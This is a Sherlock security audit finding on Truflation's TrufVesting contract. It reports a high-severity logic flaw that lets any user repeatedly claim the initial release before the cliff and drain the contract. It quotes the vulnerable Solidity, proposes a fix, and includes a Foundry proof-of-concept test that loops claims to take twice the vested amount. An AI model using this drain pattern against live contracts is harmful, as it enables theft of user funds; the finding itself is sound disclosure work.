# bughuntoor - Users can fully drain the \u0060TrufVesting\u0060 contract

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Truflation
**Keywords:** cybersecurity, vulnerability, TrufVesting, contract, claimable, arbitrary user, drain funds, logic flaw, initialRelease, cliff time, linear increase, claim function, code review, impact assessment, manual review, security recommendation, if check, proof of concept, smart contract, blockchain security, financial exploitation

---

bughuntoor

high

# Users can fully drain the \u0060TrufVesting\u0060 contract

## Summary
Due to flaw in the logic in \u0060claimable\u0060 any arbitrary user can drain all the funds within the contract.

## Vulnerability Detail
A user\u0027s claimable is calculated in the following way: 
1. Up until start time it is 0.
2. Between start time and cliff time it\u0027s equal to \u0060initialRelease\u0060.
3. After cliff time, it linearly increases until the full period ends.

However, if we look at the code, when we are at stage 2., it always returns \u0060initialRelease\u0060, even if we\u0027ve already claimed it. This would allow for any arbitrary user to call claim as many times as they wish and every time they\u0027d receive \u0060initialRelease\u0060. Given enough iterations, any user can drain the contract. 

\u0060\u0060\u0060solidity
    function claimable(uint256 categoryId, uint256 vestingId, address user)
        public
        view
        returns (uint256 claimableAmount)
    {
        UserVesting memory userVesting = userVestings[categoryId][vestingId][user];

        VestingInfo memory info = vestingInfos[categoryId][vestingId];

        uint64 startTime = userVesting.startTime + info.initialReleasePeriod;

        if (startTime > block.timestamp) {
            return 0;
        }

        uint256 totalAmount = userVesting.amount;

        uint256 initialRelease = (totalAmount * info.initialReleasePct) / DENOMINATOR;

        startTime += info.cliff;

        if (startTime > block.timestamp) {
            return initialRelease;
        }
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
    function claim(address user, uint256 categoryId, uint256 vestingId, uint256 claimAmount) public {
        if (user != msg.sender && (!categories[categoryId].adminClaimable || msg.sender != owner())) {
            revert Forbidden(msg.sender);
        }

        uint256 claimableAmount = claimable(categoryId, vestingId, user);
        if (claimAmount == type(uint256).max) {
            claimAmount = claimableAmount;
        } else if (claimAmount > claimableAmount) {
            revert ClaimAmountExceed();
        }
        if (claimAmount == 0) {
            revert ZeroAmount();
        }

        categories[categoryId].totalClaimed += claimAmount;
        userVestings[categoryId][vestingId][user].claimed += claimAmount;
        trufToken.safeTransfer(user, claimAmount);

        emit Claimed(categoryId, vestingId, user, claimAmount);
    }
\u0060\u0060\u0060


## Impact
Any user can drain the contract 

## Code Snippet
https://github.com/sherlock-audit/2023-12-truflation/blob/main/truflation-contracts/src/token/TrufVesting.sol#L176C1-L182C10

## Tool used

Manual Review

## Recommendation
change the if check to the following 
\u0060\u0060\u0060solidity
        if (startTime > block.timestamp) {
            if (initialRelease > userVesting.claimed) {
            return initialRelease - userVesting.claimed;
            }
            else { return 0; } 
        }
\u0060\u0060\u0060

## PoC 

\u0060\u0060\u0060solidity
    function test_cliffVestingDrain() public { 
        _setupVestingPlan();
        uint256 categoryId = 2;
        uint256 vestingId = 0;
        uint256 stakeAmount = 10e18;
        uint256 duration = 30 days;

        vm.startPrank(owner);
        
        vesting.setUserVesting(categoryId, vestingId, alice, 0, stakeAmount);

        vm.warp(block.timestamp + 11 days);     // warping 11 days, because initial release period is 10 days
                                                // and cliff is at 20 days. We need to be in the middle 
        vm.startPrank(alice);
        assertEq(trufToken.balanceOf(alice), 0);
        vesting.claim(alice, categoryId, vestingId, type(uint256).max);
        
        uint256 balance = trufToken.balanceOf(alice);
        assertEq(balance, stakeAmount * 5 / 100);  // Alice should be able to have claimed just 5% of the vesting 

        for (uint i; i < 39; i++ ){ 
            vesting.claim(alice, categoryId, vestingId, type(uint256).max);
        }
        uint256 newBalance = trufToken.balanceOf(alice);   // Alice has claimed 2x the amount she was supposed to be vested. 
        assertEq(newBalance, stakeAmount * 2);             // In fact she can keep on doing this to drain the whole contract
    }
\u0060\u0060\u0060


